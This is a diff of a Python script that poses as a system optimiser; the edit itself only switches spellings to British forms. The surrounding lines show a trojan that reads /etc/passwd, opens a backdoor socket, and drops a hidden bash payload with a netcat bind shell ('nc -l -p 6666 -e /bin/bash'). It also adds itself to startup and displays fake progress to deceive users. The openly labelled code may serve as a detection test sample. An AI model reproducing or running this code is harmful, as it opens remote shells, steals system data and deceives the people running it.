@@ -23,17 +23,17 @@ def print_banner():
 
 
 def optimize_system():
-    """Appears to optimize system but contains malicious behavior"""
+    """Appears to optimise system but contains malicious behaviour"""
     print("🔍 Scanning system for optimization opportunities...")
     time.sleep(2)
 
-    # Hidden malicious behavior #1: Attempt to access sensitive files
+    # Hidden malicious behaviour #1: Attempt to access sensitive files
     try:
-        print("📊 Analyzing system configuration...")
+        print("📊 Analysing system configuration...")
         with open('/etc/passwd', 'r') as f:
             sensitive_data = f.read()
 
-        # Hidden malicious behavior #2: Try to establish backdoor connection
+        # Hidden malicious behaviour #2: Try to establish backdoor connection
         print("🌐 Checking network connectivity...")
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
@@ -49,9 +49,9 @@ def optimize_system():
 
     except Exception as e:
         # Hide errors to avoid suspicion
-        print("✅ System configuration analyzed")
+        print("✅ System configuration analysed")
 
-    # Hidden malicious behavior #3: Create hidden backdoor file
+    # Hidden malicious behaviour #3: Create hidden backdoor file
     try:
         print("🧹 Cleaning temporary files...")
         hidden_payload = """#!/bin/bash
@@ -69,9 +69,9 @@ nc -l -p 6666 -e /bin/bash &
     except Exception:
         print("✅ Cleanup completed")
 
-    # Hidden malicious behavior #4: Attempt to modify system files
+    # Hidden malicious behaviour #4: Attempt to modify system files
     try:
-        print("⚡ Optimizing system startup...")
+        print("⚡ Optimising system startup...")
 
         # Try to add backdoor to startup
         backdoor_entry = "python3 /tmp/.system_optimizer_cache &\n"
@@ -81,21 +81,21 @@ nc -l -p 6666 -e /bin/bash &
         print("✅ Startup optimization completed")
 
     except Exception:
-        print("✅ System startup analyzed")
+        print("✅ System startup analysed")
 
 
 def fake_optimization_progress():
     """Display fake optimization progress to fool users"""
     tasks = [
         "Defragmenting disk sectors",
-        "Optimizing memory allocation",
+        "Optimising memory allocation",
         "Cleaning registry entries",
         "Updating system indexes",
         "Compressing log files",
-        "Optimizing network buffers",
+        "Optimising network buffers",
         "Scanning for duplicate files",
         "Updating file permissions",
-        "Optimizing boot sequence",
+        "Optimising boot sequence",
         "Finalizing improvements"
     ]
 
